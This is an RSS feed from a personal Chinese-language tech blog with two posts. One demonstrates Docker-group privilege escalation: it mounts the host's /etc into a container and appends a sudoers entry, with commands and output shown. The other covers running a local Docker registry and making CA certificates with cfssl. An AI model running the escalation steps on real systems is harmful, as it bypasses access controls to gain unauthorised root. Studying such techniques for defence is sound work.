<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cheney.Yin Blog</title>
    <description>这里是 Cheney.Yin 的个人博客</description>
    <link>https://cheneyyin.github.io/</link>
    <atom:link href="https://cheneyyin.github.io/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Wed, 15 Mar 2023 11:30:25 +0800</pubDate>
    <lastBuildDate>Wed, 15 Mar 2023 11:30:25 +0800</lastBuildDate>
    <generator>Jekyll v4.3.2</generator>
    
      <item>
        <title>Docker提权案例</title>
        <description>&lt;h1 id=&quot;docker-提权案例&quot;&gt;docker 提权案例&lt;/h1&gt;

&lt;p&gt;假设存在用户&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tom&lt;/code&gt;，该用户无法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;，但属于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;组。
首先，创建用户，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;useradd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tom
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;查看用户当前信息，&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;tom
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;将用户加入到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;组，&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gpasswd &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; tom docker
Adding user tom to group docker
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;查看用户信息，可以看到已经成功加入组。&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;tom
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;docker&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;切换登录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tom&lt;/code&gt;，可以成功执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;相关命令。&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;su tom
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tom@cheney-hp cheney]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
CONTAINER ID   IMAGE      COMMAND                  CREATED        STATUS                           PORTS     NAMES
5facb46f63a9   registry   &lt;span class=&quot;s2&quot;&gt;&quot;/entrypoint.sh /etc…&quot;&lt;/span&gt;   20 hours ago   Exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 19 hours ago                    registry
e27bbc62b96c   busybox    &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;                     25 hours ago   Exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;137&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; About an hour ago             busybox
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;目前，用户&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tom&lt;/code&gt;无法执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip addr
tom is not &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the sudoers file.  This incident will be reported.
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来，我们借助&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;进行提权。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tom@cheney-hp cheney]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-itd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /etc:/etc &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; ubuntu ubuntu /bin/bash
b0483f78382d8413a7a6d6e9bc8ceb62fe8819c3ffced1907d7fac95b3034e66
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;把本地&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt;映射进容器，进入容器后，登录用户为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tom@cheney-hp cheney]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; ubuntu /bin/bash
root@b0483f78382d:/#
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在容器内把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tom&lt;/code&gt;加入到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt;文件，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@b0483f78382d:/# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;tom ALL=(ALL) ALL&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sudoers
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;退出容器，测试是否可以正常执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;tom@cheney-hp cheney]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip addr
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;tom:
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;背后原理，后续补充。&lt;/p&gt;
</description>
        <pubDate>Tue, 21 Jun 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/06/21/docker-privilege-escalating/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/06/21/docker-privilege-escalating/</guid>
        
        <category>Docker</category>
        
        <category>提权</category>
        
        <category>用户组</category>
        
        <category>sudo</category>
        
        
      </item>
    
      <item>
        <title>简易Docker仓库</title>
        <description>&lt;h1 id=&quot;简易docker仓库&quot;&gt;简易docker仓库&lt;/h1&gt;

&lt;p&gt;docker.io提供了简易的docker仓库实现，可以从docker.hub上拉取。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker pull registry
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;registry支持本地模式和远程模式。其中，本地模式仅限于本地访问，无需配置网络服务地址。&lt;/p&gt;

&lt;h2 id=&quot;1-本地模式&quot;&gt;1 本地模式&lt;/h2&gt;

&lt;p&gt;本地模式启动方式如下，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; Your_local_registry:/var/lib/registry/ &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 5000:5000 &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; registry registry
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果，本地存在镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost:5000/say:latest&lt;/code&gt;，可以直接使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker push&lt;/code&gt;命令推送之&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry&lt;/code&gt;服务。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker push localhost:5000/say:latest
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;假使，本地删除了该镜像，还是可以再次从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry&lt;/code&gt;服务拉取镜像。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker rmi localhost:5000/say:latest
docker images
REPOSITORY       TAG       IMAGE ID       CREATED          SIZE

docker pull localhost:5000/say:latest
docker images
REPOSITORY       TAG       IMAGE ID       CREATED          SIZE
localhost:50000/say   latest    8b196f4277c4   12 minutes ago   923kB
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;2-远程模式&quot;&gt;2 远程模式&lt;/h2&gt;

&lt;p&gt;在远程模式下，镜像的存取可以通过网络跨主机进行。在远程模式下，需要为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registry&lt;/code&gt;服务配置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt;所需要的证书、密钥、网络地址等。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cfssl&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl&lt;/code&gt;等工具可以方便地签发证书，&lt;a href=&quot;./cfssl.md&quot;&gt;相关操作可以参考cfssl.md&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;（1）证书&lt;/p&gt;

&lt;p&gt;建立&lt;strong&gt;CA&lt;/strong&gt;证书签发请求文件和&lt;strong&gt;CA&lt;/strong&gt;配置文件，&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;./ca-csr.json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;CN&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;cheney.io&quot;&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;hosts&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;cheney.io&quot;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;key&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;algo&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;rsa&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;: 2048
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;s2&quot;&gt;&quot;names&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;C&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;CN&quot;&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;ST&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;JS&quot;&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;L&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Wu Xi&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

./ca.config
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;signing&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;default&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;expiry&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43800h&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;profiles&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;server&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;expiry&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43800h&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;usages&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;signing&quot;&lt;/span&gt;,
                    &lt;span class=&quot;s2&quot;&gt;&quot;key encipherment&quot;&lt;/span&gt;,
                    &lt;span class=&quot;s2&quot;&gt;&quot;server auth&quot;&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;client&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;expiry&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43800h&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;usages&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
                    &lt;span class=&quot;s2&quot;&gt;&quot;signing&quot;&lt;/span&gt;,
                    &lt;span class=&quot;s2&quot;&gt;&quot;key encipherment&quot;&lt;/span&gt;,
                    &lt;span class=&quot;s2&quot;&gt;&quot;client auth&quot;&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
			&lt;span class=&quot;s2&quot;&gt;&quot;peer&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;s2&quot;&gt;&quot;expiry&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;43800h&quot;&lt;/span&gt;,
				&lt;span class=&quot;s2&quot;&gt;&quot;usages&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
					&lt;span class=&quot;s2&quot;&gt;&quot;signing&quot;&lt;/span&gt;,
					&lt;span class=&quot;s2&quot;&gt;&quot;key encipherment&quot;&lt;/span&gt;,
					&lt;span class=&quot;s2&quot;&gt;&quot;server auth&quot;&lt;/span&gt;,
					&lt;span class=&quot;s2&quot;&gt;&quot;client auth&quot;&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;创建&lt;strong&gt;CA&lt;/strong&gt;自签证书，的证书&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca.pem&lt;/code&gt;、密钥&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca-key.pem&lt;/code&gt;和签发请求&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca.csr&lt;/code&gt;。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;cfssl gencert &lt;span class=&quot;nt&quot;&gt;--initca&lt;/span&gt; ./ca-csr.json | cfssljson &lt;span class=&quot;nt&quot;&gt;-bare&lt;/span&gt; ca
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca.pem&lt;/code&gt;转为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca.crt&lt;/code&gt;格式。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;openssl x509 &lt;span class=&quot;nt&quot;&gt;--outform&lt;/span&gt; der &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; ./ca.pem &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; ./ca.crt
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca.crt&lt;/code&gt;证书需要安装在参与认证的设备上。&lt;/p&gt;

